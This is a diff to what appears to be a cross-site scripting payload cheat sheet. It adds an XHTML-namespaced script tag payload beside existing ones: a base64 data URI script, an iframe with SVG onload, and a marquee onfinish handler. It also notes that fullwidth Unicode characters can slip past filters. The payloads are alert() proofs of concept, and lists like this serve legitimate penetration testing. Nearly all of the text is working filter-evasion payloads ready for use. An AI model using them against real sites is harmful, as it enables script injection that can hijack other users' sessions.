@@ -46,6 +46,9 @@ data:text/html;base64,PHNjcmlwdD5hbGVydCgiYnkgc3RydWt0Iik8L3NjcmlwdD4=  //alert(
 <iframe/src="data:text/html,<svg%09%0A%0B%0C%0D%A0%00%20onload=confirm(1);>">
 <marquee loop=1 width=0 onfinish=alert(1)> // FF and IE only
 
+<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1);</x:script> //Only for content served as text/xml or text/xml-xhtml
+
+
 http://www.utf8-chartable.de/unicode-utf8-table.pl?start=65280&number=128
 //The above link points to the UTF-8 fullwidth character transformations,
 useful if the server translates them to regular characters.This is an example
